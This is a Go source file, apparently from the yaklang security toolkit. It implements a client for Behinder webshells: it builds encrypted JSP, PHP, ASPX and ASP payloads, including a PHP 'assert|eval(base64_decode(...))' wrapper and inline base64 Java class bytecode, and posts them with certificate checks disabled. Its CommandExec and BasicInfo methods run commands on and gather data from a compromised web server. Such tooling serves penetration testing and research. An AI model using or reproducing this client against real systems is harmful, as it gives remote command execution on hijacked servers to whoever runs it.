package wsm

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"github.com/yaklang/yaklang/common/log"
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/utils/lowhttp"
	"github.com/yaklang/yaklang/common/wsm/payloads/behinder"
	"github.com/yaklang/yaklang/common/yakgrpc/ypb"
	"net/http"
)

type Behinder struct {
	// 连接地址
	Url string
	// 密钥
	SecretKey []byte
	// shell 类型
	ShellScript string

	Proxy string
	// response 开头的干扰字符
	respPrefixLen int
	// response 结尾的干扰字符
	respSuffixLen int
	// 自定义 header 头
	Headers       map[string]string
	Client        *http.Client
	CustomEncoder EncoderFunc
	CustomDecoder EncoderFunc
}

func NewBehinder(ys *ypb.WebShell) (*Behinder, error) {
	client := utils.NewDefaultHTTPClient()

	bs := &Behinder{
		Url:           ys.GetUrl(),
		SecretKey:     secretKey(ys.GetSecretKey()),
		ShellScript:   ys.GetShellScript(),
		Proxy:         ys.GetProxy(),
		respPrefixLen: 0,
		respSuffixLen: 0,
		Headers:       make(map[string]string, 2),
		Client:        client,
	}
	// 默认的加密方式
	bs.CustomEncoder = func(raw []byte) ([]byte, error) {
		return bs.enCryption(raw)
	}
	bs.CustomDecoder = func(raw []byte) ([]byte, error) {
		return bs.deCryption(raw)
	}
	bs.setHeaders()
	//if len(bs.Proxy) != 0 {
	//	bs.setProxy()
	//}
	return bs, nil
}

func (b *Behinder) setHeaders() {
	switch b.ShellScript {
	case ypb.ShellScript_JSP.String():
		fallthrough
	case ypb.ShellScript_JSPX.String():
		fallthrough
		//b.Headers["Content-type"] = "application/x-www-form-urlencoded"
	case ypb.ShellScript_ASPX.String():
		b.Headers["Content-type"] = "application/octet-stream"
	case ypb.ShellScript_PHP.String():
		b.Headers["Content-type"] = "application/x-www-form-urlencoded"
	case ypb.ShellScript_ASP.String():
		b.Headers["Content-type"] = "application/x-www-form-urlencoded"
	default:
		panic("shell script type error [jsp/jspx/asp/aspx/php]")
	}
}

//func (b *Behinder) setProxy() {
//	b.Client.Transport = &http.Transport{
//		Proxy: func(r *http.Request) (*url.URL, error) {
//			return url.Parse(b.Proxy)
//		},
//	}
//}

func (b *Behinder) getPayload(binCode behinder.Payload, params map[string]string) ([]byte, error) {
	var rawPayload []byte
	var err error
	hexCode := behinder.HexPayload[b.ShellScript][binCode]
	switch b.ShellScript {
	case ypb.ShellScript_JSPX.String():
		fallthrough
	case ypb.ShellScript_JSP.String():
		rawPayload, err = behinder.GetRawClass(hexCode, params)
		if err != nil {
			return nil, err
		}
	case ypb.ShellScript_PHP.String():
		rawPayload, err = behinder.GetRawPHP(hexCode, params)
		if err != nil {
			return nil, err
		}
		//rawPayload = []byte(("lasjfadfas.assert|eval(base64_decode('" + string(bincls) + "'));"))
		rawPayload = []byte(("assert|eval(base64_decode('" + base64.StdEncoding.EncodeToString(rawPayload) + "'));"))
	case ypb.ShellScript_ASPX.String():
		rawPayload, err = behinder.GetRawAssembly(hexCode, params)
		if err != nil {
			return nil, err
		}
	case ypb.ShellScript_ASP.String():
		rawPayload, err = behinder.GetRawASP(hexCode, params)
		if err != nil {
			return nil, err
		}
	}
	return b.CustomEncoder(rawPayload)
}

// 原生的加密方式
func (b *Behinder) enCryption(binCode []byte) ([]byte, error) {
	payload, err := behinder.Encryption(binCode, b.SecretKey, b.ShellScript)
	if err != nil {
		return nil, err
	}
	return payload, nil
}

//func bNativeCryption(r []byte) EncoderFunc {
//	return func(bi interface{}) ([]byte, error) {
//		b := bi.(*Behinder)
//		payload, err := behinder.Encryption(r, b.SecretKey, b.ShellScript)
//		if err != nil {
//			return nil, err
//		}
//		return payload, nil
//	}
//}

func (b *Behinder) deCryption(raw []byte) ([]byte, error) {
	var targetBts []byte
	// 提取一下 resp raw body 中的需要的结果
	if (b.respSuffixLen != 0 || b.respPrefixLen != 0) && len(raw)-b.respPrefixLen >= b.respSuffixLen {
		targetBts = raw[b.respPrefixLen : len(raw)-b.respSuffixLen]
	} else {
		targetBts = raw
	}
	return behinder.Decryption(targetBts, b.SecretKey, b.ShellScript)
}

func (b *Behinder) post(data []byte) ([]byte, error) {
	request, err := http.NewRequest(http.MethodPost, b.Url, bytes.NewReader(data))
	if err != nil {
		return nil, err
	}
	for k, v := range b.Headers {
		request.Header.Set(k, v)
	}

	lresp, err := lowhttp.HTTP(
		lowhttp.WithRequest(request),
		lowhttp.WithVerifyCertificate(false),
		lowhttp.WithTimeoutFloat(15),
		lowhttp.WithProxy(b.Proxy),
		//lowhttp.WithBeforeDoRequest(func(oringe []byte) []byte {
		//	_, body := lowhttp.SplitHTTPHeadersAndBodyFromPacket(oringe)
		//	jsonStr := `{"id":"1","body":{"user":"lucky"}}`
		//	encodedData := base64.StdEncoding.EncodeToString(body)
		//	encodedData = strings.ReplaceAll(encodedData, "+", "<")
		//	encodedData = strings.ReplaceAll(encodedData, "/", ">")
		//	jsonStr = strings.ReplaceAll(jsonStr, "lucky", encodedData)
		//	res := lowhttp.ReplaceHTTPPacketBody(oringe, []byte(jsonStr), false)
		//
		//	return res
		//}),
	)

	raw := lowhttp.GetHTTPPacketBody(lresp.RawPacket)

	return raw, nil
}

func (b *Behinder) sendPayload(data []byte) ([]byte, error) {
	body, err := b.post(data)
	if err != nil {
		return nil, err
	}
	return b.CustomDecoder(body)
}

//func (b *Behinder) Encoder(encoderFunc EncoderFunc) ([]byte, error) {
//	b.CustomEncoder = encoderFunc
//
//	return nil, nil
//}

func (b *Behinder) hijackRequestPayload() {

}

func (b *Behinder) hijackPayloadEncode() {

}

func (b *Behinder) hijackPayloadResult() {

}

func (b *Behinder) Encoder(f func(raw []byte) ([]byte, error)) {
	b.CustomEncoder = f
}

func (b *Behinder) Decoder(f func(raw []byte) ([]byte, error)) {
	b.CustomDecoder = f
}

func (b *Behinder) Unmarshal(bts []byte, m map[string]string) error {
	err := json.Unmarshal(bts, &m)
	if err != nil {
		return err
	}
	for k, v := range m {
		value, _ := base64.StdEncoding.DecodeString(v)
		m[k] = string(value)
	}

	return nil
}

func (b *Behinder) String() string {
	return fmt.Sprintf(
		"Url: %s, SecretKey: %x, ShellScript: %s, Proxy: %s, Headers: %v",
		b.Url,
		b.SecretKey,
		b.ShellScript,
		b.Proxy,
		b.Headers,
	)
}

func (b *Behinder) GenWebShell() string {
	return ""
}

func (b *Behinder) Ping(opts ...behinder.ParamsConfig) (bool, error) {
	params := map[string]string{
		"content": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
		//"CustomEncoder": "yv66vgAAADMAHgoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWBwAIAQAWamF2YS9sYW5nL1N0cmluZ0J1ZmZlcgoABwAKDAAFAAsBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYKAAcADQwADgAPAQAHcmV2ZXJzZQEAGigpTGphdmEvbGFuZy9TdHJpbmdCdWZmZXI7CgAHABEMABIAEwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsJABUAFgcAFwwAGAAZAQAPQXNvdXRwdXRSZXZlcnNlAQADcmVzAQASTGphdmEvbGFuZy9TdHJpbmc7AQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAClNvdXJjZUZpbGUBABRBc291dHB1dFJldmVyc2UuamF2YQAhABUAAgAAAAEAAAAYABkAAAACAAEABQALAAEAGgAAADcABAACAAAAFyq3AAEquwAHWSu3AAm2AAy2ABC1ABSxAAAAAQAbAAAADgADAAAABAAEAAUAFgAGAAEAEgATAAEAGgAAAB0AAQABAAAABSq0ABSwAAAAAQAbAAAABgABAAAACgABABwAAAACAB0=",
		"CustomEncoder": "yv66vgAAADMANAoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCAAIAQAieyJpZCI6IjEiLCJib2R5Ijp7InVzZXIiOiJsdWNreSJ9fQgACgEABWx1Y2t5CgAMAA0HAA4MAA8AEAEAEGphdmEvdXRpbC9CYXNlNjQBAApnZXRFbmNvZGVyAQAcKClMamF2YS91dGlsL0Jhc2U2NCRFbmNvZGVyOwoAEgATBwAUDAAVABYBABhqYXZhL3V0aWwvQmFzZTY0JEVuY29kZXIBAA5lbmNvZGVUb1N0cmluZwEAFihbQilMamF2YS9sYW5nL1N0cmluZzsIABgBAAErCAAaAQABPAoAHAAdBwAeDAAfACABABBqYXZhL2xhbmcvU3RyaW5nAQAHcmVwbGFjZQEARChMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTtMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspTGphdmEvbGFuZy9TdHJpbmc7CAAiAQABLwgAJAEAAT4JACYAJwcAKAwAKQAqAQAPQXNvdXRwdXRSZXZlcnNlAQADcmVzAQASTGphdmEvbGFuZy9TdHJpbmc7AQAFKFtCKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAClNvdXJjZUZpbGUBABRBc291dHB1dFJldmVyc2UuamF2YQEADElubmVyQ2xhc3NlcwEAB0VuY29kZXIAIQAmAAIAAAABAAAAKQAqAAAAAgABAAUAKwABACwAAABRAAUAAwAAACkqtwABEgdNLBIJuAALK7YAERIXEhm2ABsSIRIjtgAbtgAbTSostQAlsQAAAAEALQAAABYABQAAAAQABAAFAAcABgAjAAcAKAAIAAEALgAvAAEALAAAAB0AAQABAAAABSq0ACWwAAAAAQAtAAAABgABAAAADAACADAAAAACADEAMgAAAAoAAQASAAwAMwAJ",
	}
	params = behinder.ProcessParams(params, opts...)

	payload, err := b.getPayload(behinder.EchoGo, params)
	if err != nil {
		return false, err
	}

	res, err := b.sendPayload(payload)
	if err != nil {
		return false, err
	}
	log.Infof("%q", res)
	return true, nil
}

func (b *Behinder) BasicInfo(opts ...behinder.ParamsConfig) ([]byte, error) {
	params := map[string]string{
		"whatever": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
	}
	params = behinder.ProcessParams(params, opts...)
	payload, err := b.getPayload(behinder.BasicInfoGo, params)
	if err != nil {
		return nil, err
	}
	bs64res, err := b.sendPayload(payload)
	if err != nil {
		return nil, err
	}
	log.Infof("%q", bs64res)
	resJson := make(map[string]string)
	err = b.Unmarshal(bs64res, resJson)
	if err != nil {
		return nil, err
	}
	jsonByte, err := json.Marshal(resJson)
	if err != nil {
		return nil, err
	}
	//log.Infof("%q", jsonByte)

	return jsonByte, nil
}

func (b *Behinder) CommandExec(cmd string, opts ...behinder.ParamsConfig) ([]byte, error) {
	params := map[string]string{
		"cmd":  cmd,
		"path": "/",
	}
	params = behinder.ProcessParams(params, opts...)
	payload, err := b.getPayload(behinder.CmdGo, params)
	if err != nil {
		return nil, err
	}
	bs64res, err := b.sendPayload(payload)
	if err != nil {
		return nil, err
	}
	log.Infof("%q", bs64res)
	resJson := make(map[string]string)
	err = b.Unmarshal(bs64res, resJson)
	if err != nil {
		return nil, err
	}
	jsonByte, err := json.Marshal(resJson)
	if err != nil {
		return nil, err
	}
	log.Infof("%q", jsonByte)

	return jsonByte, nil
}

func (b *Behinder) FileManagement() {

}

func (b *Behinder) ShowFile() {

}
